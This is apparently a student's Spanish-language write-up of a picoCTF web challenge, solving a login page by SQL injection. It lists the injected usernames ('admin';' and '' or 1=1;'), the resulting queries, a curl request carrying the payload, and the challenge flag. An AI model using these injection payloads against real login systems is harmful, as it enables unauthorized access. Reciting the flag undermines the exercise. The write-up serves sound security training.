# Objetivo 
There is a website running at `https://jupiter.challenges.picoctf.org/problem/52849/` ([link](https://jupiter.challenges.picoctf.org/problem/52849/)). Someone has bypassed the login before, and now it's being strengthened. Try to see if you can still login! or http://jupiter.challenges.picoctf.org:52849


# Solución 

```
username: admin';
password: admin
SQL query: SELECT * FROM users WHERE name='admin';' AND password='admin'

# Logged in!

Your flag is: picoCTF{m0R3_SQL_plz_fa983901}


---------------------------------------------------------------------

jordanz28@LAPTOP-UM00GHQE:~$
jordanz28@LAPTOP-UM00GHQE:~$ curl https://jupiter.challenges.picoctf.org/problem/52849/login.php -d "username=admin';&pa
ssword=admindebug=1"
<h1>Logged in!</h1><p>Your flag is: picoCTF{m0R3_SQL_plz_fa983901}</p>jordanz28@LAPTOP-UM00GHQE:~$


```

# Notas 

Repetimos los pasos del pasado 
volvemos a cambiar el valor 0 1 para poder avanzar luego de identificar que se puede hacer lo del reto pasado 
intentamos primor lo de pasado vemos que no paso a hora cambiamos or 1=1 por un admin';
para ver si funciona 

username: ' or 1=1;
password: 1234
SQL query: SELECT * FROM users WHERE name='' or 1=1;' AND password='1234'

username: admin';
password: 1234
SQL query: SELECT * FROM users WHERE name= admin';  AND password='1234'

------------------------------------------------------------------------
username: admin';
password: admin
SQL query: SELECT * FROM users WHERE name='admin';' AND password='admin'

# Logged in!

Your flag is: picoCTF{m0R3_SQL_plz_fa983901}